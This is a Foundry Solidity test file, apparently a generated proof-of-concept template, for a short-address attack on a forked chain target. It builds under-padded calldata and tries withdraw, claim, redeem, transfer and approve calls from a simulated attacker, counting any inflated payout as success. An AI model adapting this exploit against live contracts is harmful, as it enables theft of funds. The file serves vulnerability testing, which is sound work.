// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Short Address Attack
/// @notice Detector: short-address-attack. The target lacks parameter length
///         validation. If a token contract expects 20-byte addresses, passing
///         a 19-byte address causes the EVM to right-pad the address with zeros,
///         drastically changing the destination (often making it look like a
///         much larger amount to the token).
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt to target's real token transfer.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    /// Under-padded calldata: a 19-byte address shifts every argument after it
    /// left by one byte, so the target decodes an inflated amount.
    function _short(bytes4 sel, address who, uint256 amount) internal pure returns (bytes memory) {
        bytes19 shortAddr = bytes19(bytes20(who));
        return abi.encodePacked(sel, shortAddr, uint256(amount));
    }

    /// One selector. Success is the caller's balance moving by MORE than the
    /// intended amount — the shift — never the call returning. A target that
    /// validates calldata length reverts, which is a correct "not reproduced".
    function _attemptShort(address who, bytes memory data, uint256 intended, string memory label)
        internal
        returns (bool)
    {
        uint256 before = who.balance;
        vm.prank(who);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (!ok) return false;
        // The payout lands on the caller when the shift inflates a payout path.
        return who.balance > before + intended;
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // The entry point is a GUESS: one wrong name reports "not reproduced"
        // for a vulnerability that exists under another.
        uint256 intended = 1;
        bool reproduced;
        if (!reproduced) {
            reproduced = _attemptShort(attackerEOA, _short(bytes4(keccak256("withdraw(uint256)")), attackerEOA, intended), intended, "withdraw(uint256)");
        }
        if (!reproduced) {
            reproduced = _attemptShort(attackerEOA, _short(bytes4(keccak256("claim(uint256)")), attackerEOA, intended), intended, "claim(uint256)");
        }
        if (!reproduced) {
            reproduced = _attemptShort(attackerEOA, _short(bytes4(keccak256("redeem(uint256)")), attackerEOA, intended), intended, "redeem(uint256)");
        }
        if (!reproduced) {
            reproduced = _attemptShort(attackerEOA, _short(bytes4(keccak256("transfer(address,uint256)")), attackerEOA, intended), intended, "transfer(address,uint256)");
        }
        if (!reproduced) {
            reproduced = _attemptShort(attackerEOA, _short(bytes4(keccak256("approve(address,uint256)")), attackerEOA, intended), intended, "approve(address,uint256)");
        }

        assertTrue(
            reproduced,
            "no under-padded call moved more value than intended. Tried withdraw(uint256), claim(uint256), redeem(uint256), transfer(address,uint256), approve(address,uint256). This does NOT establish safety: the entry point may be named differently, the caller may not be the beneficiary, or the target may validate calldata length (a modern compiler does)."
        );
    }
}
